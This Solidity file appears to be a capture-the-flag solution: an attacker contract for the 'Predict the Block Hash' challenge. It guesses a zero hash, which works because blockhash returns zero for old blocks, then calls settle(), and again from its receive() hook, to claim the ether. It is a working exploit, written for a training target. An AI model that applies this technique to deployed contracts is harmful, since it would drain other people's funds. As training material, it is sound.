// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "../06-PredictTheBlockHashChallenge.sol";
import "hardhat/console.sol";

contract PredictTheBlockHashAttacker {
    PredictTheBlockHashChallenge s_targetContract;
    bytes32 public myGuess;
    uint256 public attackBlock;
    bytes32 public guessBlock;
    event numberFound();

    constructor(address targetContract) {
        s_targetContract = PredictTheBlockHashChallenge(targetContract);
    }

    function preAttack() public payable {
        s_targetContract.lockInGuess{value: msg.value}(bytes32(0x00));
    }

    function attack() public {
        s_targetContract.settle();
    }

    receive() external payable {
        if (address(s_targetContract).balance >= 1 ether) {
            s_targetContract.settle();
        }
    }
}
